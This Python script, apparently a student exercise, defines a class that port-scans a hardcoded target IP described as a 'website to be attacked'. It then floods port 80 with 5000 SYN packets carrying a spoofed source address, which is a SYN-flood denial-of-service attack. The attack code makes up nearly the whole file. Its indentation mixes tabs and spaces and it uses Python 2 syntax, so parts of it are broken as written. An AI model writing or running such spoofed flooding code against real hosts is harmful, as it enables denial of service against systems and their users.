#! /usr/bin/env python
__author__ = 'Siyi Cai'

import socket
from scapy.all import *


class TcpAttack:

    def __init__(self, spoofIP, targetIP):
        #Initiate spoofIP and targetIP for class TcpAttack
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart, rangeEnd):
    
        #open openports.txt and write header
        f = open("openports.txt", 'w')
        f.write("Opened ports: \n")

        for port in range(rangeStart, rangeEnd):
	    
	    # create a socket using default parameters
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # set the timeout of 0.5
            s.settimeout(0.5)            
            try:             
                #connect target IP to the port in the range from rangeStart to rangeEnd                                                        
             	s.connect( (self.targetIP, port) )  
             	
             	#write the open port the openports.txt                               
                f.write("Port: {}\n".format(port))                                                
    	    except:  
    	    	pass                                  
    	#close openports.txt                               
        f.close()

    def attackTarget(self, port):
	    # create a socket using default parameters
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # set the timeout of 5
        s.settimeout(5)
        try: 
            #connect target IP to the open port                                                       
            s.connect( (self.targetIP, port) ) 
            
            for ct in range(5000):
		        # use scapy to send SYN packet
                send(IP(src=self.spoofIP, dst=self.targetIP)/TCP(sport=RandShort(), dport=port, flags="S"))
            return 1
        except:
            print("The port is not opened!")
            return 0

if __name__ == "__main__":

    spoofIP = '192.137.43.101'  # a fake IP address
    targetIP = '128.46.75.105'  # website to be attacked

    rangeStart = 20
    rangeEnd = 445
    port = 80    # the website's 80th port is open 

    tcp = TcpAttack(spoofIP, targetIP)

    tcp.scanTarget(rangeStart, rangeEnd)

    #attack 80 port for testing 
    if (tcp.attackTarget(80)):
    	print "port was open to attack"

